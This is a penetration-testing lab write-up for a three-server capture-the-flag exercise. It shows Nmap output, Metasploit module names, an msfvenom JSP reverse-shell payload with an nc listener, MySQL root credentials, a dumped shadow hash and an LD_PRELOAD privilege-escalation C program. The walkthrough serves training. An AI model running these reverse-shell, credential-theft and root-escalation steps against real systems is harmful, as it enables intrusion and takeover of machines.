---
description: >-
  In this lab, you will learn to find and exploit vulnerable applications and
  services primarily using the Metasploit Framework and use other popular
  scanning utilities like dirb along the way.
---

# Black-box Penetration Test 3

This exercise will help you understand how to fingerprint an application and identify its vulnerabilities. You would also perform enumeration attacks to find weaknesses in the provided applications and perform privilege escalation.

## Lab Environment

In this lab environment, the user is going to get access to a Kali GUI instance. Three machines can be accessed using the tools installed on Kali on [server1.ine.local](http://server1.ine.local), [server2.ine.local](http://server2.ine.local) and [server3.ine.local](http://server3.ine.local).

**Objective:** Attack all machines to retrieve the flags!

## Tools

The best tools for this lab are:

* cURL
* dirb
* Nmap
* Metasploit Framework
* A Web Browser

## My Solution

![](<../../../../.gitbook/assets/image (420).png>)

## Nmap

```
root@INE:~# nmap -sC -sV 192.6.232.3-5
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 09:03 IST
Nmap scan report for target-1 (192.6.232.3)
Host is up (0.000012s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.13)
|_http-server-header: Werkzeug/0.9.6 Python/2.7.13
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
MAC Address: 02:42:C0:06:E8:03 (Unknown)

Nmap scan report for target-2 (192.6.232.4)
Host is up (0.000010s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 48
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, Support41Auth, ODBCClient, LongPassword, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, FoundRows, LongColumnFlag, Speaks41ProtocolNew, InteractiveClient, IgnoreSigpipes, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: FZrNph<.sx$En}G*<0x1
|_  Auth Plugin Name: mysql_native_password
MAC Address: 02:42:C0:06:E8:04 (Unknown)

Nmap scan report for target-3 (192.6.232.5)
Host is up (0.000011s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:c9:8e:a0:ca:07:1d:e9:65:06:f2:8e:cd:51:fa:76 (RSA)
|   256 82:26:cc:66:66:5b:29:7a:82:85:95:c2:43:a0:d4:6a (ECDSA)
|_  256 a9:85:9f:da:86:52:af:8d:ca:43:39:89:fa:9c:59:11 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods:                                                                                                    
|_  Potentially risky methods: PUT DELETE                                                                          
|_http-server-header: Apache-Coyote/1.1                                                                            
|_http-title: Site doesn't have a title (text/html).                                                               
MAC Address: 02:42:C0:06:E8:05 (Unknown)                                                                           
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                            
                                                                                                                   
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                     
Nmap done: 3 IP addresses (3 hosts up) scanned in 6.98 seconds
```

## Server 1

### Dirb

![](<../../../../.gitbook/assets/image (190).png>)

### Website

![](<../../../../.gitbook/assets/image (364).png>)

![](<../../../../.gitbook/assets/image (394).png>)

### Exploit

![](<../../../../.gitbook/assets/image (88).png>)

```
use exploit/multi/http/werkzeug_debug_rce
```

![](<../../../../.gitbook/assets/image (378).png>)

![](<../../../../.gitbook/assets/image (463).png>)

![](<../../../../.gitbook/assets/image (403).png>)

![](<../../../../.gitbook/assets/image (464).png>)

![](<../../../../.gitbook/assets/image (633).png>)

![](<../../../../.gitbook/assets/image (202).png>)

## Server 2

### MySQL

```
mysql -h 192.6.232.4 -u root -pfArFLP29UySm4bZj
```

![](<../../../../.gitbook/assets/image (476).png>)

![](<../../../../.gitbook/assets/image (235).png>)

![](<../../../../.gitbook/assets/image (186).png>)

![](<../../../../.gitbook/assets/image (628).png>)

![](<../../../../.gitbook/assets/image (273).png>)

### Exploit

```
use exploit/multi/mysql/mysql_udf_payload
```

![](<../../../../.gitbook/assets/image (208).png>)

![](<../../../../.gitbook/assets/image (346).png>)

![](<../../../../.gitbook/assets/image (356).png>)

![](<../../../../.gitbook/assets/image (533).png>)

![FLAG: 4c537c0dfd18bafdcd59f53c7015550e](<../../../../.gitbook/assets/image (361).png>)

## Server 3

![](<../../../../.gitbook/assets/image (101).png>)

```
dirb http://192.6.232.5:8080
```

![](<../../../../.gitbook/assets/image (348).png>)

![](<../../../../.gitbook/assets/image (45).png>)

![](<../../../../.gitbook/assets/image (404).png>)

![](<../../../../.gitbook/assets/image (546).png>)

```
use auxiliary/scanner/http/tomcat_mgr_login
```

![](<../../../../.gitbook/assets/image (50).png>)

![](<../../../../.gitbook/assets/image (455).png>)

![](<../../../../.gitbook/assets/image (377).png>)

![](<../../../../.gitbook/assets/image (118).png>)

### Exploit

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.6.232.2 LPORT=6666 -f war -o revshell.war
```

![](<../../../../.gitbook/assets/image (73).png>)

![](<../../../../.gitbook/assets/image (475).png>)

![](<../../../../.gitbook/assets/image (138).png>)

![](<../../../../.gitbook/assets/image (460).png>)

```
nc -lvp 6666
```

![](<../../../../.gitbook/assets/image (508).png>)

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

![Flag1: EBCFE35ACC27E0EA91CF3A5AB600BABE](<../../../../.gitbook/assets/image (180).png>)

![](<../../../../.gitbook/assets/image (104).png>)

![](<../../../../.gitbook/assets/image (430).png>)

```
robert:x:999:999:robert:/home/robert:
robert:$6$D4O99Z5L$Q38CW.ym42GmIbjZRh8DA2rtLHxXgMj.ahVbrBrbWvuBXmP555cGuLG1hkQE1R0eQVX48Rs7yecdU7V96u5Tf0:17822::::::
```

![](<../../../../.gitbook/assets/image (462).png>)

![](<../../../../.gitbook/assets/image (221).png>)

![](<../../../../.gitbook/assets/image (481).png>)

```
robert:robert@1234567890!@#
username=robert | password=robert@1234567890!@#
```

![](<../../../../.gitbook/assets/image (360).png>)

![FLAG2: EC2986081E84BB845541D5CC0BEE13B3](<../../../../.gitbook/assets/image (94).png>)

![](<../../../../.gitbook/assets/image (108).png>)

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Then **compile it** using:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Finally, **escalate privileges** running

```bash
sudo LD_PRELOAD=pe.so <COMMAND> #Use any command you can run with sudo
```

![](<../../../../.gitbook/assets/image (572).png>)

![](<../../../../.gitbook/assets/image (423).png>)

![FLAG3: 560648FC63F090A8CF776326DC13FAC7](<../../../../.gitbook/assets/image (571).png>)

## Resources

* [https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld\_preload](https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld\_preload)
* [https://linuxhint.com/untar\_files\_linux/](https://linuxhint.com/untar\_files\_linux/)
* [https://gtfobins.github.io/#](https://gtfobins.github.io)
* [https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#msfvenom-reverse-shell](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#msfvenom-reverse-shell)
* [https://www.exploit-db.com/exploits/37814](https://www.exploit-db.com/exploits/37814)
